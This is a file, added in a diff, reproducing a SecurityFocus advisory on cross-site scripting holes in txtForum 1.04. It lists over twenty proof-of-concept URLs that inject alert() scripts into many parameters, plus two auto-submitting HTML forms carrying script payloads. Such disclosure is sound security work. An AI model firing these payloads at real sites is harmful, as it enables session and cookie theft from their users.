@@ -1,0 +1,49 @@
+source: http://www.securityfocus.com/bid/17054/info
+
+txtForum is prone to multiple cross-site scripting vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input. 
+
+An attacker may leverage these issues to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. This may facilitate the theft of cookie-based authentication credentials as well as other attacks.
+
+http://www.example.com/txtforum104/index.php?rand5="><script>alert('xss_string')</script>
+http://www.example.com/txtforum104/new_topic.php?r_username='><script>alert('xss_string')</script>
+http://www.example.com/txtforum104/new_topic.php?r_loc='><script>alert('xss_string')</script>
+http://www.example.com/txtforum104/profile.php?mode=viewprofile&nick=admin&r_num=<script>alert('xss_string')</script>
+http://www.example.com/txtforum104/profile.php?mode=editprofile&r_family_name="><script>alert('xss_string')</script>
+http://www.example.com/txtforum104/profile.php?mode=editprofile&r_icq="><script>alert('xss_string')</script>
+http://www.example.com/txtforum104/profile.php?mode=editprofile&r_yahoo="><script>alert('xss_string')</script>
+http://www.example.com/txtforum104/profile.php?mode=editprofile&r_aim="><script>alert('xss_string')</script>
+http://www.example.com/txtforum104/profile.php?mode=editprofile&r_homepage="><script>alert('xss_string')</script>
+http://www.example.com/txtforum104/profile.php?mode=editprofile&r_interests="><script>alert('xss_string')</script>
+http://www.example.com/txtforum104/profile.php?mode=editprofile&r_about="&lt;/textarea&gt;<script>alert('xss_string')</script>
+http://www.example.com/txtforum104/profile.php?mode=editprofile&selected1="><script>alert('xss_string')</script>
+http://www.example.com/txtforum104/profile.php?mode=editprofile&selected0="><script>alert('xss_string')</script>
+http://www.example.com/txtforum104/profile.php?mode=editprofile&signature_selected1="><script>alert('xss_string')</script>
+http://www.example.com/txtforum104/profile.php?mode=editprofile&signature_selected0="><script>alert('xss_string')</script>
+http://www.example.com/txtforum104/profile.php?mode=editprofile&smile_selected1="><script>alert('xss_string')</script>
+http://www.example.com/txtforum104/profile.php?mode=editprofile&smile_selected0="><script>alert('xss_string')</script>
+http://www.example.com/txtforum104/profile.php?mode=editprofile&ubb_selected1="><script>alert('xss_string')</script>
+http://www.example.com/txtforum104/profile.php?mode=editprofile&ubb_selected0="><script>alert('xss_string')</script>
+http://www.example.com/txtforum104/reply.php?quote=&lt;/textarea&gt;<script>alert('xss_string')</script>
+http://www.example.com/txtforum104/reply.php?tid="><script>alert('xss_string')</script>
+http://www.example.com/txtforum104/view_topic.php?page=27&tid='><script>alert('xss_string')</script>
+http://www.example.com/txtforum104/view_topic.php?print_adminJS=1&tid="><script>alert('xss_string')</script>
+
+<form action='http://www.example.com/txtforum104/view_topic.php?sticked=<script>alert("xss_string")</script>' method="post">
+<input type="text" name="where" value="sticky"/>
+<input type="submit">
+</form>
+<script type="text/javascript">
+document.forms[0].submit();
+</script>
+
+<form action='http://www.example.com/txtforum104/view_topic.php' method="post">
+<input type="text" name="where" value="deleteme"/>
+<input type="text" name="mid" value="<script>alert('xss_string')</script>"/>
+<input type="submit">
+</form>
+<script type="text/javascript">
+document.forms[0].submit();
+</script>
+
+http://www.example.com/txtforum104/view_topic.php?page=-1&tid=xss_string
+http://www.example.com/txtforum104/view_topic.php?tid=xss_string
